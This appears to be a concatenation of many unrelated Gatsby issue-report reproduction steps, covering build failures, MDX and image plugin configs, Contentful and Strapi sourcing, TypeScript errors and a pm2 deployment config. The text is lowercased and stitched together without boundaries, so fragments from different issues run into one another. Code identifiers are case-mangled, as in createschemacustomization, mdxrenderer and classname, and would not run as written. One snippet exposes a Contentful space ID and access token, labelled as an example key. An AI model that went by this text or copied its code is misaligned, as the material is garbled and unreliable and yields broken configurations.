exports.createschemacustomization = ({ actions, schema }) => { const typedefs = [ schema.buildobjecttype({ name: 'tagsjson', fields: { title: 'string', name: 'string', version: 'string', description: 'string', }, }), schema.buildobjecttype({ name: 'restjson', fields: { x_qlik_stability: 'string', tags: 'tagsjson', }, interfaces: ['node'], extensions: { infer: false, }, }), ]; actions.createtypes(typedefs);
yarn workspace website gatsby build
`npm install --save gatsby@2.23.16`
run `gatsby develop` with versions:
"gatsby": "^2.23.14",
"gatsby-cli": "^2.12.54",
``` or checkout the repo [here]( (staging branch).
> gatsby build "--prefix-paths"
success write out requires - 0.006s
warn configuring yargs through package.json is deprecated and will be removed in the next major release, please use the js api instead.
failed building production javascript and css bundles - 15.921s error #98124 webpack generating javascript bundles failed can't resolve 'core-js/modules/es.array-buffer.constructor' in '/users/mohsin.ulhaq/documents/react-popper-tooltip/node_modules/buffer' if you're trying to use a package make sure that 'core-js/modules/es.array-buffer.constructor' is installed
if you're trying to use a local file make sure that the path is correct
file: ../node_modules/buffer/index.js error #98124 webpack generating javascript bundles failed can't resolve 'core-js/modules/es.array.concat' in '/users/mohsin.ulhaq/documents/react-popper-tooltip/node_modules/buffer' if you're trying to use a package make sure that 'core-js/modules/es.array.concat' is installed
if you're trying to use a local file make sure that the path is correct
file: ../node_modules/buffer/index.js
- create a blog post content type contentful, sthg like:
\\- blog post
\\-- subtitle - `gatsby develop` source the data from contentful - change sthg in contentful - `gatsby develop` source the data from contentful again
the styles are compiling perfectly fine when running `gatsby develop`.
change the line in `gatsby-config.js` from: ``` "gatsby-plugin-sass", ``` to: ``` { resolve: `gatsby-plugin-sass`, options: { // use dart implementation of sass instead of node one implementation: require("sass"), }, }, ```
install `sass` by `npm install sass`.
re-run gatsby development environment by killing the initial environment and executing `gatsby develop` again.
the program fetchs all apis from strapi, no problem, but the error message appears in this context: `info starting to fetch data from strapi -
info starting to fetch data from strapi -
info starting to fetch data from strapi -
info starting to fetch data from strapi - error (node:43092) [dep0066] deprecationwarning: outgoingmessage.prototype._headers is deprecated success fetched strapi data - 0.272s
success source and transform nodes - 0.406s`
go to
go to products page ( click on products in navbar )
try to go back to the page by clicking the back button in the browser
this is the structure for the page: - label: "index" name: "index" file: "src/content/index.md" fields: - { label: "template", name: "template", widget: "select", options: ["other"] } - { label: "name", name: "name", widget: "string" } - { label: "title", name: "title", widget: "string" } - { label: "subtitle", name: "subtitle", widget: "string", required: false } - { label: "date", name: "date", widget: "datetime" } - { label: "image", name: "image", widget: "image", required: false } - { label: "image alt text", name: alttext, widget: string, required: false } - { label: "body title", name: bodytitle, widget: string, required: false } - { label: "body image", name: "bodyimage", widget: "image", required: false } - { label: "body image alt text", name: bodyalttext, widget: string, required: false } - { label: "body", name: "body", widget: "markdown" } - label: section name: section widget: list fields: - { label: "section title", name: title, widget: string } - { label: "section subtitle", name: subtitle, widget: string, required: false } - { label: "section description", name: description, widget: string } - { label: "section image", name: image, widget: image } - { label: "section image alt text", name: alttext, widget: string } - { label: "section image placement", name: "placement", widget: "select", options: ["card", "left", "right"] } - { label: "section link", name: link, widget: string } upload to a project and buld the site
then put the content in via the netlifycms interface
set the "link" field test in one of the sections to "/real-estate" and publish
pull the markdown file into your local project and run a local develop session
finally, pull back the data via graphiql.
here is a simple repo you can use to reproduce the problem: [
i followed the example posted here and updated the config file with our graphql server name: [
- build gatsby site
- inspect bundle
it occurs in my private blog
sadly i have no idea how i could reproduce it with a simple repo.
create a new site using `gatsby new site`, change `<img fluid={data.placeholderimage.childimagesharp.fluid} />` in `src/components/image.js` to `<img/>`
check out gatsby master, run `yarn run watch`
$ git clone
$ cd gatsby-starter-blog
$ sed -i -e 's|// `gatsby-plugin-offline`|`gatsby-plugin-offline`|' gatsby-config.js
$ yarn; yarn build
$ gatsby serve
$ lighthouse --only-categories=performance --view
![image]( ### adding `crossorigin` attribute does not help i tried to do the obvious and installed the plugin `gatsby-plugin-preload-link-crossorigin`
the plugin adds the `crossorigin` attribute but the lighthouse warning remains.
clone repository
`yarn` then `yarn start`
build a project with gatsby, react-spring/three using <a.mesh>
minimal repo:
git clone
cd gatsby-issue-link-extension-regression
yarn && yarn start
# this runs with gatsby@2.22.22 -- the query results are correctly displayed at [
# now update gatsby to latest
yarn add gatsby@2.23
# query fails
simulate a never-returning (pending) response to requests to `/page-data/app-data.json`
this can be done with eg
an express server route in front of gatsby that never returns a response.
links no longer work, without any feedback to the user
**in `gatsby-config.js` (simplified, just a snippet):** ```js
const plugins = [ 'gatsby-plugin-sharp', 'gatsby-remark-images', 'gatsby-transformer-sharp', { resolve: 'gatsby-plugin-mdx', options: { extensions: ['.mdx', '.md'], gatsbyremarkplugins: [ { resolve: 'gatsby-remark-images', options: { maxwidth: 1200, withwebp: true, // this one doesn't change anything if turned off showcaptions: true }, }, ], }
``` i've also tried adding `plugins` configuration to `gatsby-plugin-mdx` options (as defined here), but without a success
**then in a markdown file i simply include the image:** ```markdown
![some caption](./structure_header.png)
``` **generated html:** ```html
<p class="paragraph"> <figure class="gatsby-resp-image-figure"> <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px;"> <a href="/static/e01a4eb54bcb157206fb5ec697a69167/10c92/structure_header.png" target="_blank" rel="noopener noreferrer" class="css-gg2m1z"> <span class="gatsby-resp-image-background-image" style="padding-bottom: 13%; position: relative; bottom: 0px; left: 0px; background-image: url(&quot;data:image/png;base64,ivborw0kggoaaaansuheugaaabqaaaadcayaaactwi8uaaaacxbiwxmaabj0aaasdahezh94aaaatkleqvqi142mpq/bqbzg/4lrdiy+ajwa2gyix8knsimfaz/dt0b0nyko9dkw3vxuetd/m5yrhmhksx55xoyhvidlqcpqpaqpubjsfapc80eikjtnyozth8qecin3kgayxcwtmiypmlaiihncabcezlq3ou+6vomof3z73nbubfjbjhnbsgwboy+idlohtfux/ckj/unfan26uqvr7bgzqdgbgvxizqaof4gtoukakmumu2iwmvrfurwptkfks1uaaaaasuvork5cyii=&quot;); background-size: cover; display: block;"></span> <picture> <source srcset="/static/e01a4eb54bcb157206fb5ec697a69167/577d7/structure_header.webp 300w,/static/e01a4eb54bcb157206fb5ec697a69167/93ccb/structure_header.webp 600w,/static/e01a4eb54bcb157206fb5ec697a69167/1aa16/structure_header.webp 1200w,/static/e01a4eb54bcb157206fb5ec697a69167/daa23/structure_header.webp 1800w,/static/e01a4eb54bcb157206fb5ec697a69167/93377/structure_header.webp 1904w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/webp"> <source srcset="/static/e01a4eb54bcb157206fb5ec697a69167/37b9b/structure_header.png 300w,/static/e01a4eb54bcb157206fb5ec697a69167/ab3c7/structure_header.png 600w,/static/e01a4eb54bcb157206fb5ec697a69167/5c837/structure_header.png 1200w,/static/e01a4eb54bcb157206fb5ec697a69167/2f4db/structure_header.png 1800w,/static/e01a4eb54bcb157206fb5ec697a69167/10c92/structure_header.png 1904w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/png"> <img class="gatsby-resp-image-image" src="/static/e01a4eb54bcb157206fb5ec697a69167/5c837/structure_header.png" alt="some caption" title="some caption" loading="lazy" style="width: 100%; height: 100%; margin: 0px; vertical-align: middle; position: absolute; top: 0px; left: 0px;"> </picture> </a> </span> <figcaption class="gatsby-resp-image-figcaption">some caption</figcaption> </figure>
you can checkout [this]( repo which i'm trying to convert to typescript, some pages are already `.tsx` files
you can clone the project and open it with vscode to see if the imports work for you.
run ```gatsby build```
run ```gatsby build```
fire up `gatsby build` or `gatsby develop` will both cause this error: '- unknown field 'metafield' on type 'shopifyproduct'.' on an individual product query.
using `gatsby-plugin-mdx` and `gatsby-remark-images`, using the same syntax and *very* similar structure as the docs
i set the background color in `gatsby-config.js` but it doesn't change from white
the goal is no background, so i tried with `none`, `transparent`, and with color names or codes; but it stays white
currently set to `red` to see if it changes.
inspecting the element i see it's getting an inline box-shadow inserted (`box-shadow: white 0px 0px 0px 400px inset;`), and i can't overwrite it
live example:
in the link there's an image that *should* have a red or transparent background, but instead, it's white.
look at any recent docs pr compared against master (as of a couple hours ago):
installed wordpress plugins: - acf to rest api -> set to v2 ( i also tried v3 and did not work) - v3.2.0 - advanced custom fields v5.8.12
follow instructions from
install gatsby-source-cloudinary
setup your environments
run local server
run ```git push heroku master``` on the repo.
just by running ```npm install```
gatsby develop --https -h \\<host name\\>
take any gatsby site, go to any url and put this hash on the end: `#test=test`
for example: #test=test
- open #oncreatewebpackconfig
- click on any source link
put this piece of code in `src/pages/index.js` ``` <helmet> <title>langganan.co.id</title> <meta property="og:url" content="langganan.co.id" /> <meta property="og:type" content="website" /> <meta property="og:site_name" content="langganan" /> </helmet>
run a `gatsby build` demo: relevant files below: `src/templates/blog-post.js`
import react from "react"
import { link, graphql } from "gatsby"
import styled from "styled-components"
import { device } from "../styled/globalstyles"
import { mdxrenderer } from "gatsby-plugin-mdx" export default ({ data, pagecontext }) => { const { frontmatter, body } = data.mdx const { previous, next } = pagecontext return ( <pagewrapper> <article> <header> <h1 style={{ marginbottom: 0, }} > {frontmatter.title} </h1> <p classname="date">{frontmatter.date}</p> </header> <section classname="post-content"> <mdxrenderer>{body}</mdxrenderer> </section> </article> <nav classname="page-links"> <h2>more readings</h2> {!previous && !next && <p>nothing here yet!</p>} <ul> <li> {previous && ( <link to={previous.fields.slug} rel="prev"> {previous.frontmatter.title} </link> )} </li> <li> {next && ( <link to={next.fields.slug} rel="next"> {next.frontmatter.title} </link> )} </li> </ul> </nav> </pagewrapper> )
} export const query = graphql` query postsbyslug($slug: string!) { mdx(fields: { slug: { eq: $slug } }) { body frontmatter { title date(formatstring: "yyyy mmmm do") } } }
` ``` `gatsby-node.js`
const path = require(`path`)
const { createfilepath } = require(`gatsby-source-filesystem`) exports.createpages = async ({ graphql, actions }) => { const { createpage } = actions const blogpost = path.resolve(`./src/templates/blog-post.js`) const result = await graphql( ` { allmdx( sort: { fields: [frontmatter___date], order: desc } limit: 1000 ) { nodes { fields { slug } frontmatter { title } } } } ` ) if (result.errors) { throw result.errors } // create blog posts pages
const posts = result.data.allmdx.nodes posts.foreach((post, index) => { const previous = index === posts.length - 1 ? null : posts[index + 1] const next = index === 0 ? null : posts[index - 1] createpage({ path: post.fields.slug, component: blogpost, context: { slug: post.fields.slug, previous, next, }, }) })
} exports.oncreatenode = ({ node, actions, getnode }) => { const { createnodefield } = actions if (node.internal.type === `mdx`) { const value = createfilepath({ node, getnode }) createnodefield({ name: `slug`, node, value, }) }
`gatsby-config.js`
plugins: [ { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/src/pages/blog`, name: `blog`, }, }, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/content/assets`, name: `assets`, }, }, { resolve: `gatsby-plugin-mdx`, options: { defaultlayouts: { default: require.resolve("./src/templates/blog-post.js"), }, extensions: [`.md`, `.mdx`], gatsbyremarkplugins: [ { resolve: `gatsby-remark-images`, options: { maxwidth: 590, }, }, { resolve: `gatsby-remark-responsive-iframe`, options: { wrapperstyle: `margin-bottom: 1.0725rem`, }, }, `gatsby-remark-prismjs`, `gatsby-remark-copy-linked-files`, `gatsby-remark-smartypants`, ], }, },
i am not sure how to reproduce this issue as i do not know what is causing the issue
very sorry.
truthfully i am pretty sure i have not changed anything with the mdx docs on my gatsby site
since the build was working i have just updated the color scheme and home page with new content
i updated my npm packages and now cannot build the site..
but it does work with `npm run develop`
goto [ and pull the code into local.
npm install and npm run build
``` { resolve: `gatsby-source-contentful`, options: { spaceid: `w1o2zojv27gs`, accesstoken: `fjxk1qrvg7g7rkrfearmzuww1vzhddcacjcld_cjtj0`, // old-key provided in example }, },
i have a minimal reproduction [here ]( the main issue lies in my graphql query ```
export const query = graphql` query { allfile(filter: {relativepath: {regex:"/gallery/"}}) { edges{ node{ id, childimagesharp{ fluid(maxwidth:3840, maxheight:2160, quality:72 fit:inside){ ...gatsbyimagesharpfluid_withwebp } } } } } }
git clone
cd web-aeducar
gatsby build
- open gatsbyjs.org in microsoft edge
- see pages fail to load
see diff from `gatsbyjs/gatsby-starter-hello-world` here: these are the steps followed in the above repo: 1
`gatsby new mdx-remark-images-markedup-captions `
`npm install gatsby-plugin-mdx @mdx-js/mdx @mdx-js/react gatsby-source-filesystem gatsby-remark-images gatsby-plugin-sharp`
remove `src/pages/index.js` and create a new file called `index.mdx` with the following as the contents:
# hello world! ![the world](world.jpg "this text should be **bold**")
examine the output in a browser
i'm using an exported `pagequery` to pull in mdx: ```graphql query pagequery($id: string) { mdx(id: { eq: $id }) { id body frontmatter { title date } } }
``` and trying to render this with a wrapper function: ```jsx
import react from 'react'
import {mdxrenderer} from \'gatsby-plugin-mdx\' const p = (props) => <p classname="" {...props} /> const h1 = (props) => <h1 {...props} classname="text-4xl" /> const components = { p: p, h1: h1,
} const wrapper = (children) => <mdxrenderer components={components}>{children}</mdxrenderer> export default wrapper
git clone
run npm install
run npm run build
demo project (just the output of `gatsby-cli new`): 1
initialize project
npx gatsby-cli new gatsby-playground-demo
cd gatsby-playground-demo
gatsby_graphql_ide=playground npm run start
open (i tested in safari, firefox, and chrome with the same result) 3
click chema (on the right side)
create a branch which is few commit behind the head
switch to that branch
make some change
`gatsby develop`, fail
switch back to master branch (which worked before)
6 `gatsby develop` fail too
7 `gatsby clean ` `gatsby develop` fail too
run below commands, which i picked from [gatsby official documentation]( `gatsby new my-blog `
`cd my-blog`
`gatsby develop` here is the link to my git repo : [my-blog](
build a project with sufficient remote content, or a slower / throttled connection that this step in the build process would be visible to witness
i can provide a repo for trying this, but it's really going to depend on your network speed.
the full project is located here:
the problem occurs when attempting to deploy on amplify but not when running gatsby develop
#### produces correct output
- `package.json`
{ "name": "test", "version": "1.0.0", "main": "index.js", "license": "mit", "dependencies": { "rehype-mathjax": "^2.0.0", "rehype-stringify": "^8.0.0", "remark-math": "^2.0.1", "remark-parse": "^8.0.2", "remark-rehype": "^7.0.0", "to-vfile": "^6.1.0", "unified": "^9.0.0" }
- `example.js`
```javascript
const vfile = require('to-vfile')
const unified = require('unified')
const markdown = require('remark-parse')
const math = require('remark-math')
const remark2rehype = require('remark-rehype')
const svg = require('rehype-mathjax/svg')
const stringify = require('rehype-stringify') unified() .use(markdown) .use(math) .use(remark2rehype) .use(svg) .use(stringify) .process(vfile.readsync('example.md'), function(err, file) { if (err) throw err console.log(string(file)) })
- `example.md`
``` run with
yarn install
node example.js
``` #### produces incorrect output create a gatsby mdx site using the starter:
gatsby new my-mdx-starter
add plugins:
yarn add remark-math rehype-mathjax
modify `gatsby-config.js`
```javascript
plugins: [ { resolve: `gatsby-plugin-mdx`, options: { defaultlayouts: { default: path.resolve('./src/components/layout.js') }, remarkplugins: [ require('remark-math') ], rehypeplugins: [ require('rehype-mathjax') ] }, },
add a page `src/pages/page-3.mdx` containing
display a fluid type image in your template and load your page with a small screen size.
set your `browserslist` in `package.json` to `chrome > 80`: ``` json "browserslist": [ "chrome > 80" ],
``` and add `gatsby-plugin-webpack-bundle-analyser-v2` to your plugin list, then build the project.
activate ssl using this documentation of gatsby
start the gatsby site with gatsby develop --https
my code:
open the
open the console
you will see the error telling **uncaught referenceerror: firebase is not defined** ### screenshot
<img width="512" alt="firebase-is-not-defined" src=" ">
i encountered this when working in an existing project and trying to configure webpack to exclude certain libraries from the client bundle that are only used during ssr
i attempted to produce a mwe but couldn't get it to fail
however, i suspect the problem here is how attempts to override externals are interacting with gatsby's default webpack configuration
based on [these lines]( #l610), gastby configures its own externals to avoid certain packages during certain build stages
i suspect that my full example is using one of those packages, and, that failing to correctly exclude it causes webpack to try to import a file from a package that it doesn't understand how to parse, leading to the (fairly cryptic error) shown above
my mwe must not have included the problematic package
i don't know if this a problem with `webpack-merge` or with gatsby, but it seems that the configuration provided by the project is not being merged properly with gatsby's default
i'm not sure why
the following workaround works, essentially performing a manual merge, with the additional complication that the default externals is not set during certain build stages: ```ts
const config = getconfig()
// we only use jsdom, cheerio, and ace-builds during ssr, so we don't want to include them in the
// client bundle
(plus, jsdom will crash if run in the browser.)
const ourexternals = [/jsdom/, /cheerio/, /ace-builds/]
const externals = config.externals ? [...ourexternals, ...config.externals] : ourexternals
actions.setwebpackconfig({ externals })
`gatsby new example ` `gatsby develop -h 0.0.0.0`
make breaking structural changes in a graphql page query like renaming frontmatter fields in markdown and update the page query (after the site has been deployed and cached before)
make use of the updated query result in ui components of the page/template.
install any starter
add a console log
run `gatsby develop`
i have an `.md` file that contains a list looking like this: ```
my list: - a
- import and export products
``` running `yarn start` throws an error: ```
error #11321 plugin "gatsby-plugin-mdx" threw an error while running the oncreatenode lifecycle: unknown: unexpected token (1:11) > 1 | import and export products | ^/some/path/to/a/file.md: unknown: unexpected token (1:11) > 1 | import and export products | ^ syntaxerror: unknown: unexpected token (1:11) > 1 | import and export p roducts | ^/some/path/to/a/file.md: unknown: unexpected token (1:11) > 1 | import and export p roducts | ^ syntaxerror: unknown: unexpected token (1:11) > 1 | import and export p roducts
``` if i change the following line from: ```
- import and export products
- <span>import and export products</span>
``` the error goes away and everything compiles as normal my understanding is that because `import` and `export` are [reserved words in javascript]( this line tries to import a module instead of treating this as text
make some changes to the gatsby core project 1
run `yarn run watch --scope=gatsby` 1
go to any of the cypress e2e test project folders 1
run gatsby-dev
- create a contentful entry that uses markdown
- add an image url in the markdown content that contains a search param (ex: example.com?foo=bar)
- setup `gatsby-remark-images-contentful` in your gatsby project (add it to your `gatsby-config.js`
- the build will break after the `bootstrap` build step is complete.
clone down [gatsby-starter-notes-theme](
run `npm install`
run `gatsby develop`
see the error in the browser of `element type is invalid: expected a string (for built-in components) or a class/function (for composite components) but got undefined
check `node_modules/theme-ui` and confirm that its package.json has a version number of `0.4.x`.
add the following code: ```
{ resolve: 'gatsby-plugin-google-gtag', options: { trackingids: [ 'aw-google_ad_words', 'ua-google_analytics', ], gtagconfig: { anonymize_ip: false, optimize_id: 'gtm-container', }, pluginconfig: { head: true, respectdnt: false, }, }, },
add the following to gatsby-browser.js - also note that `getsavedscrollposition` returns null when passing location.path and location.key
exports.shouldupdatescroll = ({ routerprops, getsavedscrollposition
}) => { const currentlocation = getsavedscrollposition(routerprops.location, routerprops.location.key); console.log(currentlocation); // null return false; // still scrolls in firefox & chrome, does as expected in safari
1) add a js file to /public/company/random-file.js
2) extend html.js (in the head tag) with: <script type="text/javascript" src="company/random-file.js"></script>
ln -s src/components/something/charting_library static/ yarn build
reproduce with version: "gatsby": "2.23.1", "gatsby-image": "2.4.6", "gatsby-plugin-catch-links": "2.3.4", "gatsby-plugin-manifest": "2.4.10", "gatsby-plugin-react-helmet": "3.3.3", "gatsby-plugin-remove-serviceworker": "1.0.0", "gatsby-plugin-sass": "2.3.3", "gatsby-plugin-sharp": "2.6.10", "gatsby-plugin-typescript": "2.4.4", "gatsby-remark-autolink-headers": "2.3.4", "gatsby-remark-copy-linked-files": "2.3.4", "gatsby-remark-external-links": "0.0.4", "gatsby-remark-images": "3.3.9", "gatsby-remark-link-rewrite": "0.2.1", "gatsby-remark-prismjs": "3.5.3", "gatsby-remark-relative-images": "0.3.0", "gatsby-remark-responsive-iframe": "2.4.4", "gatsby-remark-smartypants": "2.3.3", "gatsby-source-filesystem": "2.3.10", "gatsby-transformer-json": "2.4.4", "gatsby-transformer-remark": "2.8.14", "gatsby-transformer-sharp": "2.5.4",
i'm unsure of exact steps, although if necessary i might be able to create some
but from what i have seen, i believe it could be triggered when a plugin throws an exception with a stack trace entry which contains `gatsby-node` but is not a valid filename
in my case the invalid filename is `async c:\\users\\mathew\\development\\dive-club-gatsby\ ode_modules\\gatsby-source-google-spreadsheet\\gatsby-node.js`.
ran a brand new site using gatsby new test-site; cd test-site; gatsby develop and encountered the same 2 problems.
updated all my dependencies to latest, tried to build the project, it failed
``` error #11328 a page component must export a react component for it to be valid
please make sure this file exports a react component: undefined not finished createpagesstatefully - 0.039s
error command failed with exit code 1.
info visit for documentation about this command.
``` here's a minimal-ish repository i extracted from my project where this fails:
it correctly shows a single "hello world" page when you run development mode.
clone my [personal site repository]( 2
move into yarn workspaces ( create a parent directory and define workspaces )
delete all the node_modules, public & .cache within this repository
reinstall and develop with `yarn workspace personalsite install` & `yarn workspace personalsite develop`
see the error on the console.
gatsby new hello-world
cd hello-world
gatsby develop
create new file on /src/pages
delete or rename the file
update anything on index.js the error will pop up on browser and console.
if i don't include the `gatsby-remark-images` plugin the contentful blog images work as expected, it only happens if i have both plugins defined
*gatsby-config.js*
{ resolve: 'gatsby-transformer-remark', options: { plugins: [ { resolve: 'gatsby-remark-images', options: { maxwidth: 800, backgroundcolor: 'var(--color-background)', }, }, { resolve: 'gatsby-remark-images-contentful', options: { maxwidth: 800, backgroundcolor: 'var(--color-background)', }, }, ], },
``` <img width="1181" alt="screenshot 2020-06-06 at 7 33 43 am" src=" ">
create a new site with ```gatsby new gatsby-site```
install @mdx-js/runtime ```npm i @mdx-js/runtime```
import in any component or page the package ```import mdx from '@mdx-js/runtime'```
run ```npm start```
run a unit test using jest with rtl for any component that uses the gatsby link component.
sorry, not easy to reproduce, since i'm trying to pinpoint what png image is the one that is breaking sharp plugin (specifically, what is breaking vips2png )
it seems it's an open issue
check out the renovate gatsby upgrade branch of my gatsby starter (
run 'npm install'
run 'npm run build' ## expected behavior no build errors ## actual result same errors as originally in the linked (now closed) ticket
node_modules/@types/react/index.d.ts:1347:15 - error ts2320: interface 'domattributes<t>' cannot simultaneously extend types 'sxprops' and 'sxprops'
named property 'sx' of types 'sxprops' and 'sxprops' are not identical
1347 interface domattributes<t> { ~~~~~~~~~~~~~ node_modules/@types/react/index.d.ts:2962:19 - error ts2320: interface 'intrinsicattributes' cannot simultaneously extend types 'sxprops' and 'sxprops'
named property 'sx' of types 'sxprops' and 'sxprops' are not identical
2962 interface intrinsicattributes extends react.attributes { } ~~~~~~~~~~~~~~~~~~~ node_modules/gatsby/index.d.ts:14:27 - error ts2307: cannot find module './src/bootstrap/load-plugins/types' or its corresponding type declarations
14 import { pluginref } from "./src/bootstrap/load-plugins/types" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ node_modules/theme-ui/dist/index.d.ts:6:51 - error ts7016: could not find a declaration file for module \'@theme-ui/color-modes\'
'/volumes/workspace/project/node_modules/@theme-ui/color-modes/dist/index.js' implicitly has an 'any' type
try `npm install @types/theme-ui__color-modes` if it exists or add a new declaration (.d.ts) file containing `declare module '@theme-ui/color-modes';` 6 export { usecolormode, initializecolormode } from '@theme-ui/color-modes'; ~~~~~~~~~~~~~~~~~~~~~~~ node_modules/theme-ui/dist/index.d.ts:7:36 - error ts7016: could not find a declaration file for module '@theme-ui/mdx'
'/volumes/workspace/project/node_modules/@theme-ui/mdx/dist/index.js' implicitly has an 'any' type
try `npm install @types/theme-ui__mdx` if it exists or add a new declaration (.d.ts) file containing `declare module '@theme-ui/mdx';` 7 export { styled, components } from '@theme-ui/mdx'; ~~~~~~~~~~~~~~~ node_modules/theme-ui/dist/index.d.ts:8:31 - error ts7016: could not find a declaration file for module '@theme-ui/theme-provider'
'/volumes/workspace/project/node_modules/@theme-ui/theme-provider/dist/index.js' implicitly has an 'any' type
try `npm install @types/theme-ui__theme-provider` if it exists or add a new declaration (.d.ts) file containing `declare module '@theme-ui/theme-provider';` 8 export { themeprovider } from '@theme-ui/theme-provider'; ~~~~~~~~~~~~~~~~~~~~~~~~~~
``` ## environment shouldn't be relevant, fails on netlify build and locally.
you just need to go to: to see the missing avatar
it looks like a change in the instagram api or kyle changed his instagram picture...
run `tsc -p ./tsconfig.json --noemit` in gatsby typescript project
in this [repo]( you will find a description on how to recreate this, as well as an example build of this issue
load this [website]( on a browser with a viewport-width <678px.
visit [docs & blog components](
click on "gatsby brand guidelines", and note that the link is incorrect.
attempt to call `navigate(-1)` from within a gatsby app.
- github repo <
- netlify build of repo <
in my tests this behavior already shows when spinning up a hello-world starter.
clone [this]( ` ` see this line: #l34-l40 ![image](
follow instructions in this repo: #steps-to-reproduce-a-bug-with-pagequery-not-reflecting-changes
npm init npm install --save gatsby-source-contentful
clone [this repository]( and `npm start`.
example repo here: * `npm ci`
* `npm ls gatsby` ### expected: a consistent dependency tree ### actual: gatsby@2.22.13 -> gatsby-admin@^0.1.54 -> gatsby-interface@0.0.163 -> gatsby@2.6.0 note the gatsby-admin dependency is a caret dependency, while the others are specific version dependencies
this appears to be a result of #23734 (and #24451).
build gatsby project with typescript without `--skiplibcheck`
i created a minimal reproducible test case [here](
just pull and `npm start`
in my case, it only fetches 100 posts.
load up [www.gatsbyjs.org/](www.gatsbyjs.org/) on an ios device using voiceover.
in the bottom bar, touch, then double-tap tutorials.
touch the "secondary navigation" button near the bottom right corner, right above the sticky bottom navigation bar
it is spoken as "collapsed".
now, swipe to the right.
add an image with imgstyle={{ objectfit: contain }} and disable javascript before loading the page or look at the static html in the public dir after build
open gatsby-image's [demo website]( in chrome/firefox and safari(a browser that doesn't support web so it defaults to png/jpg) and compare the quality difference
here is a screenshot, left chrome, right safari:
<img width="961" alt="screenshot 2020-05-29 at 16 28 59" src=" ">
- contentful space with multiple locales, no fallback and not required for at least one locale
- a contentful model with a rich text field that allows embedded entries.
- add an entry of that content model and add a linked entry in the rich text editor.
- make a build on a clean cache
- remove the linked entry and add another one.
- build again on the same cache
npx gatsby new gatsby-prismic-blog
cd gatsby-prismic-blog
yarn add gatsby-source-prismic-graphql prismic-javascript prismic-reactjs
``` minimal reproduction:
create a project that uses the `gatsby-transformer-documentationjs` plugin
do not source any js files
have a page/static query that calls `documentationjs`, eg: ```
alldocumenationjs { nodes { description { id } }
run `gatsby clean` or `gatsby develop`.
start a new gatsby project or just run `npm update`; and,
try to execute `gatsby develop` or `build` or `serve`.
run `gatsby serve` in on projects run again in another project
respond with `y` when asked if gatsby should use a different port
clone [my repo at this point](
install dependencies `yarn`
run develop `yarn develop`
`rm -rf .cache && rm -rf public && npm run develop` 2
see console error, tldr missing `unified` package ```
internal/modules/cjs/loader.js:960 throw err; ^ error: cannot find module 'unified'
require stack:
- /gatsby/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/parser/index.js
- /gatsby/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/parser/validate.js
- /gatsby/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/validate-steps.js
- /gatsby/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/recipe-machine/index.js
- /gatsby/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/graphql-server/server.js at function.module._resolvefilename (internal/modules/cjs/loader.js:957:15) at function.module._load (internal/modules/cjs/loader.js:840:27) at module.require (internal/modules/cjs/loader.js:1019:19) at require (internal/modules/cjs/helpers.js:77:18) at object.<anonymous> (/gatsby/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/parser/index.js:3:17) at module._compile (internal/modules/cjs/loader.js:1133:30) at object.module._extensions..js (internal/modules/cjs/loader.js:1153:10) at module.load (internal/modules/cjs/loader.js:977:32) at function.module._load (internal/modules/cjs/loader.js:877:14) at module.require (internal/modules/cjs/loader.js:1019:19) { code: 'module_not_found', requirestack: [ '/gatsby/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/parser/index.js', '/gatsby/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/parser/validate.js', '/gatsby/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/validate-steps.js', '/gatsby/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/recipe-machine/index.js', '/gatsby/node_modules/gatsby-cli/node_modules/gatsby-recipes/dist/graphql-server/server.js' ]
npm i -g gatsby-cli gatsby develop
a minimal reproduction was created by @chpio already in #21901:
- navigate directly to
- inspect the link under "check if the link works on my old website" source for this page: #l33
execute `gatsby new`
install npm install --save gatsby-source-filesystem
copy the code gatsby-config.js
check id and base
create a new gatsby site with `gatsby new ...`
install the following node packages:
``` "gatsby": "2.22.0", "react": "16.13.1", "react-dom": "16.13.1"
run `gatsby develop` here is a demo project:
repo: run gatsby build run gatsby serve
make a plugin and try to destructure `getnodesbytype` **index.js** ```js
module.exports = ({ getnodesbytype, markdownast }, pluginoptions) => { const customnodes = getnodesbytype('coolnodetype') // ^-- throws an error return markdownast
create new gatsby project from default starter
install and configure `gatsby-source-contentful`
upload `gatsby-astronaut` image to contentful
edit the `image` component query to this:
query { contentfulasset(title: { eq: "gatsby-astronaut" }) { fixed(width: 500) { width height src srcset srcwebp srcsetwebp } }
npm run develop
the following [fork of a starter template]( demonstrates the bug
check specifically [index.js]( and [index.css](
it boils down to a `usestate` getting initialised with this piece of code:
```javascript
if ((typeof window) === 'undefined') { // required for build not to fail return no_url;
} return window.location.href;
``` the conditional statement is there for gatsby to be able to build, because `window` is not defined during building.
-setup ec2 instance
-install node on instance
-setup ssh key for github on instance
-install pm2 on instance
-create deploy ecosystem config for pm2 in gatsby git repo
like the following
module.exports = { apps: [ { name: "wispyco", script: "node_modules/gatsby/dist/bin/gatsby.js", args: "develop", exec_mode: "cluster_mode", watch: ".", env: { node_env: "production", sanity_token: "fdsaf", sendgrid_api_key: "fdsaf", sendgrid_to_email: "fdsaf", }, }, ], deploy: { production: { user: "ubuntu", host: "fdsfa.compute-1.amazonaws.com", ref: "origin/development", repo: "git@github.com:fdsfa.git", path: "/home/ubuntu/wispydeploy", "pre-deploy-local": "", "post-deploy": "npm install && pm2 reload ecosystem.config.js --env production && npm install -g gatsby-cli", "pre-setup": "", }, },
i have also tried the script and args line to be `script: npm`
`args:start` -pm2 setup script
pm2 deploy ecosystem.config.js production setup
-pm2 deploy script
pm2 deploy ecosystem.config.js production
- `pm2 logs` on instance to see it keep dying when i run ```
pm2 start node_modules/gatsby/dist/bin/gatsby.js --name app01 -- develop
